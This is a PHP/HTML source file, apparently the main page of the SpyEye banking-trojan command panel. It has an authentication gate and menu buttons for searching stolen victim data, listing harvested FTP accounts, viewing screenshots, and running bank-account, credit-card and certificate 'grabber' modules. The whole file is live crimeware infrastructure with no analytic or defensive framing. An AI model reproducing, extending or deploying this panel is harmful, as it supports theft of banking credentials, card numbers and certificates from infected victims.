<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/tr/html4/loose.dtd">
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
		<title>SYN 1</title>
		<link href="css/style.css" type=text/css rel=stylesheet>
		<script type="text/javascript" src="js/ajax.js"></script>
	</head>
	<body>

	<center>
	<div id="div_main" class="div_main">
		
		<noscript>
		<font class='error'>Your JavaScript is turned off. Please, enable your JS.</font>
		</noscript>
		
		<?php require_once 'mod_auth.php'; if (!auth()) exit; ?>
	
		<!-- ajax main panel -->
		<div id='div_mainp'>
		
		<img src='img/spylogo.png'>
		
		<hr size='1' color='#CCC'>
		
		<script>
		function onFindrep() {
			el = document.getElementById('data');
			if (el) {
				el.focus();
			}
		}
		</script>
		
		<table cellspacing="0" cellpadding="0" border="0" width='100%' height="50px">
			<tr>
			<td align='left'><?php require_once 'frm_clock.php'; ?></td>
			<td width='540px' align='center'>
				<a href="#" onclick="ajax_load('frm_findrep.php', 'div_ajax', onFindrep); return false;" title='Find !NFO'><img src='img/b-findrep.png' alt='findrep' border='0'></a>
				<a href="#" onclick="ajax_load('frm_stat.php', 'div_ajax'); return false;" title='Tasks Statistic'><img src='img/b-statistics.png' alt='statistics' border='0'></a>
				<a href="#" onclick="ajax_load('frm_findftp.php', 'div_ajax'); return false;" title='FTP accounts'><img src='img/b-ftp.png' alt='ftp' border='0'></a>
				<a href="#" onclick="ajax_load('frm_settings.php', 'div_ajax'); return false;" title='Settings'><img src='img/b-settings.png' alt='settings' border='0'></a>
				<a href="#" onclick="ajax_load('frm_scr.php', 'div_ajax'); return false;" title='Screenshots'><img src='img/b-screenshots.png' alt='screenshots' border='0'></a>
				<a href="#" onclick="ajax_load('frm_boa-grabber.php', 'div_ajax'); return false;" title='BOA Grabber : You need BOA Injects Pack for use this future'><img src='img/b-boa-grabber.png' alt='boa-grabber' border='0'></a>
				<a href="#" onclick="ajax_load('frm_cc-grabber.php', 'div_ajax'); return false;" title='CC Grabber : You need the CC Grabber plugin for use this feature'><img src='img/b-cc-grabber.png' alt='cc-grabber' border='0'></a>
				<a href="#" onclick="ajax_load('frm_cert-grabber.php', 'div_ajax'); return false;" title='Certificate Grabber'><img src='img/b-cert-grabber.png' alt='cert-grabber' border='0'></a>
				<?php
				$icfg = parse_ini_file('config.ini');
				$bugs = $icfg['bugs'];
				if (intval($bugs) == 1) {
					echo "<a href=\"#\" onclick=\"ajax_load('frm_bugs.php', 'div_ajax'); return false;\" title='Bugreports'><img src='img/b-bugs.png' alt='bugs' border='0'></a>";
				}
				?>
				</td>
			<td align='right'><?php require_once 'frm_stat-qview.php'; ?></td>
			</tr>
		</table>
		</div>
		
		<hr size='1' color='#CCC'>
	
		<!-- ajax container -->
		<div id='div_ajax' align='center'>
		
		</div>
	
	</div>
	</center>
	
	
		
		<script>
		if (navigator.userAgent.indexOf('Mozilla/4.0') != -1) {
			alert('Your browser is not support yet. Please, use another (FireFox, Opera, Safari)');
			document.getElementById('div_main').innerHTML = '<font class="error">ChAnGE YOuR BRoWsEr! Dont use BUGGED Microsoft products!</font>';
			}
		</script>
	
	</body>
</html>